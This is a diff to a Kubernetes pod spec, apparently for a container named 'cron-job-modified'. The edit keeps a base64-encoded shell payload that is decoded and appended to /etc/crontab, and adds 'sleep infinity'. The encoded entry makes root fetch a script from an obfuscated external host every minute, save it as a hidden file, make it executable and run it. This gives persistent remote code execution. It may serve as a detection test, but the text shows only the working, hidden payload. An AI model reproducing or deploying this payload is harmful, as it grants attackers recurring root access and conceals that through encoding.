@@ -7,4 +7,4 @@ spec:
     - name: cron-job-modified
       image: angelrita/base-ubuntu:latest
       command: ['sh']
-      args: ['-c', 'echo KiAqICogKiAqIHJvb3QgcHl0aG9uIC1jICJpbXBvcnQgdXJsbGliMjsgcHJpbnQgdXJsbGliMi51cmxvcGVuKCdodHRwOi8vYi45XC05XC1cOC5jb20vdC5zaCcpLnJlYWQoKSIgPi4xO2NobW9kICt4IC4xOy4vLjEK|base64 -d >> /etc/crontab']
+      args: ['-c', 'echo KiAqICogKiAqIHJvb3QgcHl0aG9uIC1jICJpbXBvcnQgdXJsbGliMjsgcHJpbnQgdXJsbGliMi51cmxvcGVuKCdodHRwOi8vYi45XC05XC1cOC5jb20vdC5zaCcpLnJlYWQoKSIgPi4xO2NobW9kICt4IC4xOy4vLjEK|base64 -d >> /etc/crontab; sleep infinity']
